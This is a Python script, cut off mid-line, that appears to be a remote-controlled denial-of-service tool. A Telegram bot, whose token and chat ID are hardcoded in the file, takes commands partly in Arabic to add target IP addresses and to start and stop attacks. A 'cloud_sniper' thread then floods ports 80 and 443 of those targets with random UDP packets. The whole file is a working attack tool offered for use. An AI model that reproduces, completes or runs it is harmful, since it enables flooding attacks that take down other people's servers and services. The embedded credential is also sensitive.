import socket, random, threading, time, requests

TOKEN = "8603678400:AAHHOLE8XWV7XVWNE_nyuTG4NP1_FjBSvXA"
ID = "8343706519"
TARGETS = []
STATUS = "STOPPED"
sent_packets = 0

def telegram(msg):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={'chat_id': ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=10)
    except: pass

def cloud_sniper():
    global sent_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        if STATUS == "RUNNING" and TARGETS:
            try:
                for ip in TARGETS:
                    payload = random._urandom(1024)
                    sock.sendto(payload, (ip, 80))
                    sock.sendto(payload, (ip, 443))
                    sent_packets += 2
                time.sleep(0.01)
            except: pass
        else: time.sleep(1)

def cloud_controller():
    global STATUS, sent_packets, TARGETS
    last_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id+1}&timeout=30"
            res = requests.get(url).json()
            for up in res.get("result", []):
                last_id = up["update_id"]
                msg = up.get("message", {}).get("text", "").strip()
                
                if msg == "/start":
                    help_text = (
                        "🛰️ *MONITOR CLOUD V3*\n"
                        "----------------------------\n"
                        "🚀 *How to use:*\n"
                        "1️⃣ Send the IP address directly (e.g. `1.1.1.1`)\n"
                        "2️⃣ Send *اشتغل* to start sniping\n"
                        "3️⃣ Send *توقف* to stop\n"
                        "4️⃣ Send *الوضع* for live status\n"
                        "5️⃣ Send *تصفير* to clear targets\n"
                        "----------------------------\n"
                        "🎮 *System Status:* ONLINE"
                    )
                    telegram(help_text)

                elif msg == "اشتغل":
                    if not TARGETS:
                        telegram("⚠️ *Error:* No targets found! Please send an IP first.")
                    else:
                        STATUS = "RUNNING"
                        telegram(f"🔥 *Action:* Cloud attack started on: `{', '.join(
